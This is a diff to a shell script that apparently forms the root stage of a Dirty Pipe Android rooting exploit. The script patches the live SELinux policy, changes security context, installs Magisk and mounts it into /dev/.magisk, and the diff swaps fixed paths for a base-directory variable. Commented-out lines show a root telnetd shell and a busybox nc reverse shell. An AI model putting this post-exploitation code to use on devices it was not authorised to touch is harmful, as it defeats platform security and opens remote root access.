@@ -2,8 +2,10 @@
 # Called from modprobe-payload
 # Now in root user + permissive domain (u:r:vendor_modprobe:s0)
 
+BASE_DIR=$(readlink -f $(dirname $0))
+
 if [ -z "$1" ]; then
-    log=/data/local/tmp/root-log1
+    log=$BASE_DIR/root-log1
 
     # BOOTCLASSPATH is required for magiskd
     export ANDROID_DATA=/data
@@ -29,7 +31,7 @@ if [ -z "$1" ]; then
 
     export USER=root
     export PATH=/data/local/tmp/bin:/dev/.magisk:/product/bin:/apex/com.android.runtime/bin:/apex/com.android.art/bin:/system_ext/bin:/system/bin:/system/xbin:/odm/bin:/vendor/bin:/vendor/xbin
-    export HOME=/data/local/tmp
+    export HOME=$BASE_DIR
 
     # Sometimes unstable behaviors like EACCESS on accessing file happen.
     # It may be caused by cache of old selinux policy.
@@ -47,45 +49,45 @@ if [ -z "$1" ]; then
         sleep 1
     done
 
-    echo Start startup-root >> $log
+    echo Start startup-root. BASE_DIR=$BASE_DIR >> $log
 
-    #/data/local/tmp/magisk/magiskpolicy --save /data/local/tmp/policy-dump
-    ln -s /data/local/tmp/magisk/magiskinit /data/local/tmp/magisk/magiskpolicy 2>> $log
-    /data/local/tmp/magisk/magiskpolicy --magisk --live 2>> $log
+    #$BASE_DIR/magiskpolicy --save $BASE_DIR/policy-dump
+    ln -s $BASE_DIR/magisk/magiskinit $BASE_DIR/magisk/magiskpolicy 2>> $log
+    $BASE_DIR/magisk/magiskpolicy --magisk --live 2>> $log
 
     echo u:r:magisk:s0 > /proc/self/attr/current
 
     echo `date`: `id` >> $log
 
     # Send completion signal to restore files
-    /data/local/tmp/magisk/busybox killall -s SIGUSR1 dirtypipe-android
+    $BASE_DIR/magisk/busybox killall -s SIGUSR1 dirtypipe-android
 
     # INSECURE
-    # /data/local/tmp/magisk/busybox telnetd -l /bin/sh -p 10848 &
+    # $BASE_DIR/magisk/busybox telnetd -l /bin/sh -p 10848 &
 
     # Reverse shell: A little safer
     #HOST=127.0.0.1
     #PORT=10847
     #sleep 1
-    #FIFO=/data/local/tmp/reverse-fifo
+    #FIFO=$BASE_DIR/reverse-fifo
     #
     #rm -f $FIFO
     #mkfifo $FIFO
-    #cat $FIFO | /system/bin/sh -i 2>&1|/data/local/tmp/magisk/busybox nc $HOST $PORT > $FIFO
+    #cat $FIFO | /system/bin/sh -i 2>&1|$BASE_DIR/magisk/busybox nc $HOST $PORT > $FIFO
 
     # Experimental Magisk root access.
 
     # Avoid error: 'CANNOT LINK EXECUTABLE "/system/bin/app_process64": library "libnativeloader.so" not found: needed by main executable'
     # startup-root is launched in bootstrap mount namespace. It prevent app_process from launch. Pull default ns from init to avoid it.
     # I don't know why we are in bootstrap mount ns even though we forked from init.
-    /data/local/tmp/magisk/busybox nsenter -t 1 -m $0 magisk > /data/local/tmp/mylog2 2>&1 < /dev/null
+    $BASE_DIR/magisk/busybox nsenter -t 1 -m $0 magisk > $BASE_DIR/mylog2 2>&1 < /dev/null
 
 else
     #set -e
 
     id
 
-    /data/local/tmp/env-patcher || true
+    $BASE_DIR/env-patcher || true
 
     # Credit: https://github.com/j4nn/CVE-2020-0041/blob/v50g8-mroot/scripts/magisk-start.sh
 
@@ -94,14 +96,14 @@ else
     #./magiskpolicy --live --magisk "allow shell * * *"
 
     # Stuck until screen is unlocked?
-    pm install -r /data/local/tmp/magisk/Magisk-v24.3.apk > /dev/null 2>&1 < /dev/null || true
+    pm install -r $BASE_DIR/magisk/Magisk-v24.3.apk > /dev/null 2>&1 < /dev/null || true
 
     M=/dev/.magisk
 
     umount $M || true
     mkdir $M 2> /dev/null || true
     mount -t tmpfs none $M
-    cp /data/local/tmp/magisk/* $M || true
+    cp $BASE_DIR/magisk/* $M || true
 
     cd $M
 
